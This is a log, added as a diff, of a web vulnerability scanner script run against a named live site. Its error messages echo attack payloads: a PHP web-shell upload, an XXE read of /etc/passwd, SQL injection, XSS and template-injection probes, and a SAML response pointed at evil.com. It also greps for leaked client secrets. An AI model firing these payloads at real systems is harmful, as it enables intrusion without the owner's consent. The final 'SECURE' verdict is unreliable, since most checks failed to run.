+Variable $target set to https://siigo.com
+Variable $stop set to 0
+[SCAN] Auth0 Security Testing
+Target: https://siigo.com
+Variable $auth0_vulns set to 0
+Extracted https://.*\.auth0\.com using regex and stored in $auth0_domain
+Extracted issuer.*auth0\.com using regex and stored in $tenant_info
+Extracted auth0-debug|debugger using regex and stored in $debug_mode
+Extracted debug_info|stack_trace using regex and stored in $api_debug
+Extracted status and stored in $error_handling
+Extracted Invalid authorization code using regex and stored in $code_validation
+Extracted Location using header and stored in $redirect_url
+Extracted status and stored in $none_algo
+Extracted status and stored in $mgmt_api
+Extracted users|clients|connections using regex and stored in $api_endpoints
+Extracted domain|clientId|clientSecret using regex and stored in $config_leak
+Extracted AUTH0_DOMAIN|AUTH0_CLIENT_SECRET using regex and stored in $env_leak
+Variable $i set to 0
+While loop executed 0 times
+
+✅ Script completed in 31.4660795s
+
+────────────────────────────────────────────────────────────
+CHECK: 0058_azure_b2c_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0058_azure_b2c_vulnerabilities.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: { at line 1, column 39:
+POST "$target/oauth2/v2.0/token" json {
+                                      ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0059_openid_connect_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0059_openid_connect_vulnerabilities.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: { at line 1, column 27:
+POST "$target/token" json {
+                          ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0060_saml_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0060_saml_vulnerabilities.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected token: http://evil.com">" at line 1, column 67:
+POST "$target/saml/acs" body "SAMLResponse=<Response Destination="http://evil.com">"
+                                                                  ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0061_scim_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0061_scim_vulnerabilities.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: { at line 1, column 34:
+POST "$target/scim/v2/Bulk" json {
+                                 ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0062_react_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0062_react_vulnerabilities.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: { at line 1, column 33:
+POST "$target/api/comment" json {
+                                ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0063_angular_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0063_angular_vulnerabilities.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected token: alert at line 1, column 59:
+GET "$target/api/template?name={{constructor.constructor("alert(1)")()}}"
+                                                          ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0064_jquery_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0064_jquery_vulnerabilities.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected token: alert at line 1, column 38:
+GET "$target?q=<script>$.globalEval("alert(1)")</script>"
+                                     ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0065_ai_llm_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0065_ai_llm_vulnerabilities.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: { at line 1, column 30:
+POST "$target/api/chat" json {
+                             ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0066_data_reconnaissance
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0066_data_reconnaissance.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 19: no alternative matched for rule program at line 1, column 1:
+extract regex ""ng-app"|angular" as $angular_tech
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0070_owasp_top_01_10
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0070_owasp_top_01_10.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: : at line 1, column 40:
+POST "$target/login" body "{\"username": "\" OR 1=1--", "password": "test"}"
+                                       ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0071_owasp_top_11_20
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0071_owasp_top_11_20.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: : at line 1, column 92:
+POST "$target/api/xml" body "<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"
+                                                                                           ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0072_owasp_top_21_30
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0072_owasp_top_21_30.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: . at line 1, column 103:
+POST "$target/upload" body "--boundary\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--boundary--"
+                                                                                                      ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0073_owasp_top_31_40
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0073_owasp_top_31_40.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 14: no alternative matched for rule program at line 1, column 1:
+header "Content-Length" "4"
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0074_owasp_top_41_50
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0074_owasp_top_41_50.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 14: no alternative matched for rule program at line 1, column 1:
+header "Upgrade" "websocket"
+^
+
+
+════════════════════════════════════════════════════════════
+SUMMARY
+════════════════════════════════════════════════════════════
+
+Vulnerabilities Found:
+  CRITICAL: 0
+  HIGH:     0
+  MEDIUM:   0
+  LOW:      0
+
+Risk Score: 0
+Risk Level: SECURE
